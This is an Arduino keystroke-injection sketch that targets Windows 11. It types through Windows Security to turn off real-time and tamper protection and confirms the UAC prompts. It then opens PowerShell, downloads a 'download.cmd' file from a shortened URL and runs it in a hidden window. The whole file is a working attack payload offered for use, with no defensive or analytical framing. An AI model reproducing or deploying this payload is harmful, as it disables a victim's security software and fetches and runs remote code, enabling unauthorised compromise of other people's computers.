#include "Keyboard.h"
/*
This script is specifically designed for Windows 11. It disables "Real Time Protection" as well as "Tamper Protection" AND
will click through any UAC prompts in the process. Please note, with Arduino there is no way to capture the state of Real Time 
Protection, and therefore if it is already off, it will essentially reenable it. The delays can be tweaked to suit your needs
depending on the hardware of the target computer. Once Windows Security is manually disabled, It also adds "C:\" as an exclusion via
powershell and changes registry values to disable virus protection even further.
*/
void typeKey(uint8_t key)
{
  Keyboard.press(key);
 delay(125);
  Keyboard.release(key);
}


void setup()
{
  //Inititializing keyboard sequence
  Keyboard.begin();

  // Wait 1.5 seconds after mounted to begin payload
  
 delay(1000);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();

 delay(125);
  Keyboard.print(F("virus & threat protection"));

 delay(2000);
  typeKey(KEY_RETURN);

 delay(125);
  typeKey(KEY_TAB);

 delay(125);
  typeKey(KEY_TAB);

 delay(125);
  typeKey(KEY_TAB);

 delay(125);
  typeKey(KEY_TAB);

 delay(125);
  typeKey(KEY_RETURN);

 delay(125);
  typeKey(' ');

 delay(250);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.releaseAll();

 delay(125);
  typeKey(KEY_TAB);

 delay(125);
  typeKey(KEY_TAB);

 delay(125);
  typeKey(KEY_TAB);

 delay(125);
  typeKey(KEY_TAB);

 delay(125);
  typeKey(' ');

delay(250);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.releaseAll();

  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();
 
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll(); 
  
 delay(125);
  Keyboard.print(F("powershell"));

 delay(50);
  typeKey(KEY_RETURN);

delay(2000);
  Keyboard.print(F("powershell -c Invoke-WebRequest -Uri 'https://shorturl.at/JPSU4' -OutFile 'download.cmd'"));
 delay(1500); 
  typeKey(KEY_RETURN);
delay(250);
  Keyboard.print(F("powershell -c Start-Process ./download.cmd -WindowStyle hidden"));
  typeKey(KEY_RETURN);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}